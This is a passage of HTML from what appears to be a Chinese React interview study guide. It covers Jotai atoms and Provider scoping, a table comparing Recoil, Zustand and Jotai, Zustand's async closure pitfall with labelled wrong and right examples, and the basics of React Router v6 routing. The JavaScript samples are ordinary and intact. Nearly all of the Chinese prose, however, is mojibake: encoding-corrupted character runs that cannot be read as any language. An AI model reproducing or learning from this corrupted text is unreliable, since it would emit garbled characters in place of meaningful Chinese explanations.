ç±»å‹æ¨æ–­éå¸¸å‹å¥½ã€‚</li></ul><p><strong>é€‚ç”¨åœºæ™¯</strong></p><ul><li>ç»å¤§å¤šæ•°åº”ç”¨åœºæ™¯ï¼Œç‰¹åˆ«æ˜¯è¿½æ±‚ç®€æ´ã€é«˜æ•ˆã€æ˜“ç”¨çš„é¡¹ç›®ã€‚ä»ä¸­å°å‹åˆ°å¤§å‹é¡¹ç›®éƒ½é€‚ç”¨ã€‚æ˜¯ç›®å‰éå¸¸æµè¡Œçš„ Redux æ›¿ä»£å“ã€‚</li></ul><h3 id="Jotai"><a href="#Jotai" class="headerlink" title="Jotai"></a>Jotai</h3><p><strong>æ ¸å¿ƒæ€æƒ³</strong>ï¼š å— Recoil çš„ Atom æ¦‚å¿µå¯å‘ï¼Œä½† API è®¾è®¡æ›´ç²¾ç®€å’ŒåŸå§‹ï¼ˆPrimitiveï¼‰ã€‚å®Œå…¨æ‹¥æŠ± React çš„ Context å’Œ Hooks æ€æƒ³ã€‚</p><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong></p><ul><li>Atom: çŠ¶æ€çš„åŸºæœ¬å•ä½ã€‚å®šä¹‰ä¸€ä¸ªåŒ…å«åˆå§‹å€¼çš„ Atomï¼ˆä¸éœ€è¦å”¯ä¸€çš„å…¨å±€ keyï¼ï¼‰ã€‚</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; atom &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;jotai&#x27;</span>;<br><span class="hljs-keyword">const</span> countAtom = <span class="hljs-title function_">atom</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// åˆå§‹å€¼</span><br></code></pre></td></tr></table></figure><ul><li>Derived Atom: é€šè¿‡è¯»å–å…¶ä»– Atom çš„å€¼è®¡ç®—è€Œæ¥ã€‚å¯ä»¥æ˜¯åªè¯»çš„æˆ–å¯å†™çš„ï¼ˆé€šè¿‡å®šä¹‰ä¸€ä¸ª get å‡½æ•°å’Œä¸€ä¸ªå¯é€‰çš„ set å‡½æ•°ï¼‰ã€‚</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> doubledCountAtom = <span class="hljs-title function_">atom</span>(<span class="hljs-function">(<span class="hljs-params">get</span>) =&gt;</span> <span class="hljs-title function_">get</span>(countAtom) * <span class="hljs-number">2</span>); <span class="hljs-comment">// åªè¯»æ´¾ç”Ÿ</span><br><span class="hljs-comment">// å¯å†™æ´¾ç”Ÿ (set ä¼šæ›´æ–°ä¾èµ–çš„åŸå§‹ atom)</span><br><span class="hljs-keyword">const</span> countPlusOneAtom = <span class="hljs-title function_">atom</span>(<br>  <span class="hljs-function">(<span class="hljs-params">get</span>) =&gt;</span> <span class="hljs-title function_">get</span>(countAtom) + <span class="hljs-number">1</span>, <span class="hljs-comment">// getter</span><br>  <span class="hljs-function">(<span class="hljs-params">get, set, newValue</span>) =&gt;</span> &#123; <span class="hljs-title function_">set</span>(countAtom, newValue - <span class="hljs-number">1</span>) &#125; <span class="hljs-comment">// setter</span><br>);<br></code></pre></td></tr></table></figure><p><strong>Hooks API</strong></p><ul><li>useAtom(atom)ï¼š æ ¸å¿ƒ Hookã€‚è¿”å› [value, setter]ã€‚ç»„ä»¶ä¼šè®¢é˜…ä¼ é€’ç»™ useAtom çš„è¿™ä¸ªç‰¹å®š Atom çš„å˜åŒ–ã€‚</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useAtom</span>(countAtom);<br>  <span class="hljs-comment">// ... render</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Provider ä¸ Context</strong></p><ul><li>é»˜è®¤æƒ…å†µä¸‹ï¼ŒAtom çŠ¶æ€æ˜¯å…¨å±€å…±äº«çš„ï¼ˆé€šè¿‡ Jotai å†…éƒ¨çš„é»˜è®¤ Contextï¼‰ã€‚</li><li>Providerï¼š å¦‚æœéœ€è¦åˆ›å»ºéš”ç¦»çš„çŠ¶æ€ä½œç”¨åŸŸï¼ˆä¾‹å¦‚åœ¨å¾®å‰ç«¯ã€æµ‹è¯•æˆ–éœ€è¦å¤šä¸ªç‹¬ç«‹å®ä¾‹çš„åœºæ™¯ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ <code>&lt;Provider&gt;</code> åŒ…è£¹ç»„ä»¶æ ‘ã€‚Provider å†…çš„ç»„ä»¶è®¿é—®çš„æ˜¯è¯¥ Provider ä½œç”¨åŸŸå†…çš„ Atom çŠ¶æ€ã€‚</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Provider</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;jotai&#x27;</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Provider</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ComponentThatUsesAtoms</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Provider</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å…³é”®ç‰¹æ€§&#x2F;ä¼˜åŠ¿</strong></p><ul><li>æç®€ APIï¼š æ ¸å¿ƒ API åªæœ‰ atom å’Œ useAtomã€‚æ¦‚å¿µæå…¶ç²¾ç®€ã€‚</li><li>çµæ´»çš„ç»„åˆæ€§ï¼š Atom å¯ä»¥è‡ªç”±ç»„åˆï¼Œæ„å»ºå¤æ‚çŠ¶æ€é€»è¾‘ã€‚</li><li>æ—  Key è®¾è®¡ï¼š ä¸éœ€è¦ä¸º Atom å®šä¹‰å…¨å±€å”¯ä¸€çš„ keyï¼Œç®€åŒ–äº†å®šä¹‰å’Œä½¿ç”¨ã€‚</li><li>åŸºäº Contextï¼š åº•å±‚åˆ©ç”¨ React Context å®ç°ï¼Œä½†é€šè¿‡ä¼˜åŒ–é¿å…äº† Context çš„æ¸²æŸ“çˆ†ç‚¸é—®é¢˜ã€‚Provider æä¾›äº†çŠ¶æ€éš”ç¦»èƒ½åŠ›ã€‚</li><li>è½»é‡çº§ï¼š åŒ…ä½“ç§¯éå¸¸å°ã€‚</li><li>ä¼˜ç§€çš„å¹¶å‘æ¨¡å¼å…¼å®¹æ€§ã€‚</li></ul><p><strong>é€‚ç”¨åœºæ™¯</strong></p><ul><li>å–œæ¬¢æç®€ APIã€åŸå­åŒ–æ€æƒ³ï¼Œä¸”å¯èƒ½éœ€è¦çŠ¶æ€éš”ç¦»ï¼ˆProviderï¼‰çš„é¡¹ç›®ã€‚ä¸­å°å‹åˆ°å¤§å‹é¡¹ç›®å‡å¯ã€‚</li></ul><h3 id="å¯¹æ¯”ä¸é€‰å‹å»ºè®®-é¢è¯•é«˜é¢‘"><a href="#å¯¹æ¯”ä¸é€‰å‹å»ºè®®-é¢è¯•é«˜é¢‘" class="headerlink" title="å¯¹æ¯”ä¸é€‰å‹å»ºè®® (é¢è¯•é«˜é¢‘)"></a>å¯¹æ¯”ä¸é€‰å‹å»ºè®® (é¢è¯•é«˜é¢‘)</h3><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">Recoil</th><th align="left">Zustand</th><th align="left">Jotai</th></tr></thead><tbody><tr><td align="left">æ ¸å¿ƒæ¨¡å‹</td><td align="left">Atoms + Selectors (Graph)</td><td align="left">Centralized Store + Actions</td><td align="left">Atoms (Primitive)</td></tr><tr><td align="left">API å¤æ‚åº¦</td><td align="left">ä¸­ç­‰ (æ¦‚å¿µè¾ƒå¤š)</td><td align="left">æä½ (éå¸¸ç®€æ´)</td><td align="left">å¾ˆä½ (æå…¶ç²¾ç®€)</td></tr><tr><td align="left">å­¦ä¹ æ›²çº¿</td><td align="left">ä¸­ç­‰åä¸Š</td><td align="left">ä½</td><td align="left">ä½</td></tr><tr><td align="left">çŠ¶æ€æ›´æ–°ç²’åº¦</td><td align="left">ç»†ç²’åº¦ (Atom&#x2F;Selector çº§)</td><td align="left">ç»†ç²’åº¦ (Selector å‡½æ•°çº§)</td><td align="left">ç»†ç²’åº¦ (Atom çº§)</td></tr><tr><td align="left">Provider è¦æ±‚</td><td align="left"><code>&lt;RecoilRoot&gt;</code> å¿…éœ€</td><td align="left">ä¸éœ€è¦ (å…¨å±€ Store)</td><td align="left">å¯é€‰ (é»˜è®¤å…¨å±€ï¼Œå¯éš”ç¦»)</td></tr><tr><td align="left">å¼‚æ­¥å¤„ç†</td><td align="left">å¼ºå¤§ (Selector + Suspense)</td><td align="left">è‰¯å¥½ (åœ¨ Action ä¸­å¤„ç†)</td><td align="left">è‰¯å¥½ (åœ¨ Atom æˆ– Effect ä¸­å¤„ç†)</td></tr><tr><td align="left">TypeScript</td><td align="left">ä¼˜ç§€</td><td align="left">æä½³</td><td align="left">æä½³</td></tr><tr><td align="left">åŒ…ä½“ç§¯</td><td align="left">è¾ƒå¤§</td><td align="left">å¾ˆå°</td><td align="left">æå°</td></tr><tr><td align="left">å¼€å‘ä½“éªŒ (DX)</td><td align="left">å¥½ (Meta å·¥å…·)</td><td align="left">æä½³ (ç®€æ´ï¼ŒDevTools)</td><td align="left">æä½³ (ç®€æ´)</td></tr><tr><td align="left">é€‚ç”¨è§„æ¨¡</td><td align="left">å¤§å‹ &#x2F; å¤æ‚æ´¾ç”ŸçŠ¶æ€</td><td align="left">å…¨è§„æ¨¡ (å°¤å…¶æ¨è)</td><td align="left">å…¨è§„æ¨¡ (æ¨èä¸­å°åˆ°ä¸­å¤§å‹)</td></tr><tr><td align="left">ç±»ä¼¼åº“</td><td align="left">-</td><td align="left">Valtio, React Tracked</td><td align="left">Recoil (ç®€åŒ–ç‰ˆ)</td></tr></tbody></table><h3 id="é¢è¯•è¸©å‘ç‚¹ä¸é«˜é¢‘é—®é¢˜"><a href="#é¢è¯•è¸©å‘ç‚¹ä¸é«˜é¢‘é—®é¢˜" class="headerlink" title="é¢è¯•è¸©å‘ç‚¹ä¸é«˜é¢‘é—®é¢˜"></a>é¢è¯•è¸©å‘ç‚¹ä¸é«˜é¢‘é—®é¢˜</h3><ul><li>useRecoilValueLoadable çŠ¶æ€ (state, contents)? Recoil å¼‚æ­¥ Selector ä½¿ç”¨ useRecoilValueLoadable è·å– Loadable å¯¹è±¡ï¼Œå…¶ state è¡¨ç¤ºçŠ¶æ€ (â€˜hasValueâ€™, â€˜loadingâ€™, â€˜hasErrorâ€™)ï¼Œcontents åŒ…å«å®é™…å€¼æˆ– Error å¯¹è±¡ã€‚</li><li>Zustand æ€§èƒ½å…³é”® (selector å‡½æ•°)ï¼š åŠ¡å¿…ä½¿ç”¨å¸¦é€‰æ‹©å™¨å‡½æ•°çš„ useStore(selector) æ¥é¿å…è®¢é˜…æ•´ä¸ª Store å¯¼è‡´çš„æ— æ•ˆæ¸²æŸ“ã€‚å¼ºè°ƒé€‰æ‹©å™¨ç»“æœå˜åŒ–æ‰ä¼šè§¦å‘æ¸²æŸ“ã€‚</li><li>Jotai çš„ Provider ä½œç”¨ï¼š ç†è§£é»˜è®¤å…¨å±€ Context å’Œ <Provider> åˆ›å»ºéš”ç¦»ä½œç”¨åŸŸçš„åŒºåˆ«åŠé€‚ç”¨åœºæ™¯ï¼ˆå¾®å‰ç«¯ã€æµ‹è¯•ã€ç»„ä»¶åº“ï¼‰ã€‚</li><li>ä¸å¯å˜æ›´æ–° (æ‰€æœ‰åº“)ï¼š è™½ç„¶ Zustand å’Œ Jotai åœ¨ set æ—¶å¯ä»¥â€œç›´æ¥ä¿®æ”¹â€ï¼Œä½†æœ€ä½³å®è·µä»æ˜¯ä¿æŒä¸å¯å˜æ€§ï¼ˆå°¤å…¶æ•°ç»„&#x2F;å¯¹è±¡ï¼‰ï¼Œä»¥é¿å…æ½œåœ¨çš„æ¸²æŸ“é—®é¢˜æˆ– DevTools è·Ÿè¸ªé—®é¢˜ã€‚Zustand å¸¸é…åˆ immer ä¸­é—´ä»¶ã€‚</li><li>é—­åŒ…é™·é˜± (å¼‚æ­¥ Action)ï¼š åœ¨ Zustand&#x2F;Jotai çš„å¼‚æ­¥ Action ä¸­ï¼Œå¦‚æœä¾èµ–å½“å‰çŠ¶æ€è¿›è¡Œè®¡ç®—ï¼Œåº”ä½¿ç”¨ get() å‡½æ•° (Zustand) æˆ– get å‚æ•° (Jotai çš„ Atom set)ï¼Œè€Œä¸æ˜¯ç›´æ¥è¯»å–é—­åŒ…ä¸­çš„æ—§çŠ¶æ€å€¼ã€‚<ul><li>é”™è¯¯ç¤ºä¾‹ (Zustand é—­åŒ…é™·é˜±):</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šé—­åŒ…å¯èƒ½æ•è·æ—§çš„ count</span><br><span class="hljs-keyword">const</span> useStore = <span class="hljs-title function_">create</span>(<span class="hljs-function">(<span class="hljs-params">set</span>) =&gt;</span> (&#123;<br>  <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">incrementAsync</span>: <span class="hljs-title function_">async</span> () =&gt; &#123;<br>    <span class="hljs-keyword">await</span> <span class="hljs-title function_">delay</span>(<span class="hljs-number">1000</span>);<br>    <span class="hljs-title function_">set</span>(&#123; <span class="hljs-attr">count</span>: count + <span class="hljs-number">1</span> &#125;); <span class="hljs-comment">// è¿™é‡Œçš„ `count` æ˜¯åˆ›å»ºæ—¶çš„åˆå§‹å€¼ 0ï¼</span><br>  &#125;<br>&#125;));<br></code></pre></td></tr></table></figure><ul><li>æ­£ç¡®åšæ³• (ä½¿ç”¨ get):</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âœ… æ­£ç¡®ï¼šé€šè¿‡ get è®¿é—®æœ€æ–°çŠ¶æ€</span><br><span class="hljs-keyword">const</span> useStore = <span class="hljs-title function_">create</span>(<span class="hljs-function">(<span class="hljs-params">set, get</span>) =&gt;</span> (&#123;<br>  <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">incrementAsync</span>: <span class="hljs-title function_">async</span> () =&gt; &#123;<br>    <span class="hljs-keyword">await</span> <span class="hljs-title function_">delay</span>(<span class="hljs-number">1000</span>);<br>    <span class="hljs-title function_">set</span>(&#123; <span class="hljs-attr">count</span>: <span class="hljs-title function_">get</span>().<span class="hljs-property">count</span> + <span class="hljs-number">1</span> &#125;); <span class="hljs-comment">// è·å–å½“å‰æœ€æ–°å€¼</span><br>  &#125;<br>&#125;));<br></code></pre></td></tr></table></figure><ul><li>ä¸ React 18 å¹¶å‘ç‰¹æ€§çš„å…¼å®¹æ€§ï¼š å¼ºè°ƒ Recoil å’Œ Jotai åœ¨è®¾è®¡ä¸Šè€ƒè™‘äº†å¹¶å‘æ¸²æŸ“ã€‚Zustand ä¹ŸåŸºæœ¬å…¼å®¹ï¼Œä½†éœ€æ³¨æ„åœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹çš„åŒé‡æ¸²æŸ“å¯èƒ½å¸¦æ¥çš„å‰¯ä½œç”¨é—®é¢˜ï¼ˆå¯é€šè¿‡ä¸­é—´ä»¶æˆ–çŠ¶æ€ç¨³å®šåŒ–å¤„ç†ï¼‰ã€‚</li><li>ä¸ºä»€ä¹ˆä¸ç”¨ Context ä»£æ›¿ï¼Ÿ Context åœ¨çŠ¶æ€æ›´æ–°æ—¶ä¼šå¯¼è‡´æ‰€æœ‰æ¶ˆè´¹è¯¥ Context çš„ç»„ä»¶é‡æ–°æ¸²æŸ“ï¼Œæ— è®ºå®ƒä»¬æ˜¯å¦ä¾èµ–äºå˜åŒ–çš„é‚£éƒ¨åˆ†çŠ¶æ€ã€‚è¿™åœ¨é¢‘ç¹æ›´æ–°æˆ–å¤§å‹çŠ¶æ€å¯¹è±¡æ—¶æ€§èƒ½æå·®ã€‚Recoil&#x2F;Zustand&#x2F;Jotai éƒ½é€šè¿‡è®¢é˜…æœºåˆ¶å®ç°äº†ç»†ç²’åº¦æ›´æ–°ã€‚</li></ul><h1 id="ç¬¬å…­ç« ï¼šReact-Router-ä¸æ•°æ®è¯·æ±‚"><a href="#ç¬¬å…­ç« ï¼šReact-Router-ä¸æ•°æ®è¯·æ±‚" class="headerlink" title="ç¬¬å…­ç« ï¼šReact Router ä¸æ•°æ®è¯·æ±‚"></a>ç¬¬å…­ç« ï¼šReact Router ä¸æ•°æ®è¯·æ±‚</h1><h2 id="6-1-React-Router-åŸºç¡€ï¼ˆBrowserRouterã€Routeã€Linkï¼‰"><a href="#6-1-React-Router-åŸºç¡€ï¼ˆBrowserRouterã€Routeã€Linkï¼‰" class="headerlink" title="6.1 React Router åŸºç¡€ï¼ˆBrowserRouterã€Routeã€Linkï¼‰"></a>6.1 React Router åŸºç¡€ï¼ˆBrowserRouterã€Routeã€Linkï¼‰</h2><h3 id="åŸºç¡€æ¦‚å¿µï¼ˆç®€è¦ï¼‰"><a href="#åŸºç¡€æ¦‚å¿µï¼ˆç®€è¦ï¼‰" class="headerlink" title="åŸºç¡€æ¦‚å¿µï¼ˆç®€è¦ï¼‰"></a>åŸºç¡€æ¦‚å¿µï¼ˆç®€è¦ï¼‰</h3><p><strong>SPA è·¯ç”±åŸç†</strong></p><ul><li>åœ¨å•é¡µåº”ç”¨ä¸­ï¼Œè·¯ç”±åˆ‡æ¢ä¸ä¼šè§¦å‘é¡µé¢åˆ·æ–°</li><li>é€šè¿‡ç›‘å¬ URL å˜åŒ–ï¼ˆhash æˆ– history APIï¼‰ï¼ŒåŠ¨æ€æ¸²æŸ“å¯¹åº”ç»„ä»¶</li><li>ä¿æŒåº”ç”¨çŠ¶æ€çš„åŒæ—¶å®ç°è§†å›¾åˆ‡æ¢</li></ul><p><strong>React Router æ ¸å¿ƒä½œç”¨</strong></p><ul><li>å£°æ˜å¼è·¯ç”±é…ç½®</li><li>URL ä¸ç»„ä»¶çš„æ˜ å°„å…³ç³»ç®¡ç†</li><li>å¯¼èˆªæ§åˆ¶ï¼ˆå£°æ˜å¼ <code>&lt;Link&gt;</code> å’Œç¼–ç¨‹å¼ navigateï¼‰</li></ul><h3 id="æ ¸å¿ƒç»„ä»¶æ·±åº¦è§£æï¼ˆReact-Router-v6ï¼‰"><a href="#æ ¸å¿ƒç»„ä»¶æ·±åº¦è§£æï¼ˆReact-Router-v6ï¼‰" class="headerlink" title="æ ¸å¿ƒç»„ä»¶æ·±åº¦è§£æï¼ˆReact Router v6ï¼‰"></a>æ ¸å¿ƒç»„ä»¶æ·±åº¦è§£æï¼ˆReact Router v6ï¼‰</h3><p><strong><code>&lt;BrowserRouter&gt;</code></strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å…¥å£æ–‡ä»¶ index.js</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">BrowserRouter</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">createRoot</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;root&#x27;</span>)).<span class="hljs-title function_">render</span>(<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">BrowserRouter</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">BrowserRouter</span>&gt;</span></span><br>);<br></code></pre></td></tr></table></figure><ul><li>ä½œç”¨ï¼šä½¿ç”¨ HTML5 History API (pushState, replaceState) ç®¡ç†è·¯ç”±</li><li>ç‰¹ç‚¹ï¼š<ul><li>URL æ ¼å¼ä¸ºå¹²å‡€çš„è·¯å¾„ï¼ˆå¦‚ &#x2F;dashboardï¼‰</li><li>éœ€è¦æœåŠ¡å™¨é…åˆï¼šæ‰€æœ‰è·¯ç”±è¯·æ±‚éœ€è¿”å› index.html</li><li>é¢è¯•å‘ç‚¹ï¼šç›´æ¥è®¿é—®å­è·¯ç”±å‡ºç° 404 çš„è§£å†³æ–¹æ¡ˆï¼ˆé…ç½®æœåŠ¡å™¨ fallbackï¼‰</li></ul></li></ul><p><strong><code>&lt;Routes&gt;</code> ä¸ <code>&lt;Route&gt;</code></strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Routes</span>, <span class="hljs-title class_">Route</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span></span><br><span class="language-xml">      &#123;/* åŸºç¡€è·¯ç”± */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">HomePage</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">      </span><br><span class="language-xml">      &#123;/* åŠ¨æ€è·¯ç”± */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/users/:id&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">UserDetail</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">      </span><br><span class="language-xml">      &#123;/* åµŒå¥—è·¯ç”± */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/dashboard&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">DashboardLayout</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">index</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">DashboardHome</span> /&gt;</span>&#125; /&gt; &#123;/* index è·¯ç”± */&#125;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;settings&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">SettingsPage</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      &#123;/* 404 è·¯ç”± */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;*&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">NotFoundPage</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>&lt;Routes&gt;</code>ï¼š<ul><li>è·¯ç”±åŒ¹é…å®¹å™¨ï¼Œæ›¿ä»£ v5 çš„ <Switch></li><li>è‡ªåŠ¨é€‰æ‹©æœ€ä½³åŒ¹é…çš„è·¯ç”±ï¼ˆä¸å†æŒ‰é¡ºåºåŒ¹é…ï¼‰</li></ul></li><li><code>&lt;Route&gt;</code> å…³é”®å±æ€§ï¼š<ul><li>pathï¼šURL åŒ¹é…è§„åˆ™ï¼ˆæ”¯æŒ :id åŠ¨æ€å‚æ•°ï¼‰</li><li>elementï¼šåŒ¹é…æ—¶æ¸²æŸ“çš„ç»„ä»¶ï¼ˆå¿…é¡»æ˜¯ React å…ƒç´ ï¼Œå¦‚ <Component />ï¼‰</li><li>indexï¼šæ ‡è¯†é»˜è®¤å­è·¯ç”±ï¼ˆå½“çˆ¶è·¯ç”±åŒ¹é…æ—¶æ¸²æŸ“ï¼‰</li></ul></li></ul><p><strong><code>&lt;Link&gt;</code> ä¸ <code>&lt;NavLink&gt;</code></strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Link</span>, <span class="hljs-title class_">NavLink</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-comment">// åŸºç¡€é“¾æ¥</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/about&quot;</span>&gt;</span>å…³äºæˆ‘ä»¬<span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span></span><br><br><span class="hljs-comment">// å¸¦çŠ¶æ€çš„å¯¼èˆª</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Link</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/users/123&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">state</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">fromDashboard:</span> <span class="hljs-attr">true</span> &#125;&#125;  // <span class="hljs-attr">ä¼ é€’çŠ¶æ€</span></span></span><br><span class="hljs-tag"><span class="language-xml">&gt;</span></span><br><span class="language-xml">  ç”¨æˆ·è¯¦æƒ…</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span></span><br><br><span class="hljs-comment">// æ´»åŠ¨é“¾æ¥æ ·å¼</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">NavLink</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/dashboard&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;(&#123;</span> <span class="hljs-attr">isActive</span> &#125;) =&gt;</span> (&#123; </span><br><span class="language-xml">    color: isActive ? &#x27;red&#x27; : &#x27;blue&#x27; </span><br><span class="language-xml">  &#125;)&#125;</span><br><span class="language-xml">  end  // ç²¾ç¡®åŒ¹é…ï¼ˆv6 æ–°ç‰¹æ€§ï¼‰</span><br><span class="language-xml">&gt;</span><br><span class="language-xml">  æ§åˆ¶å°</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span 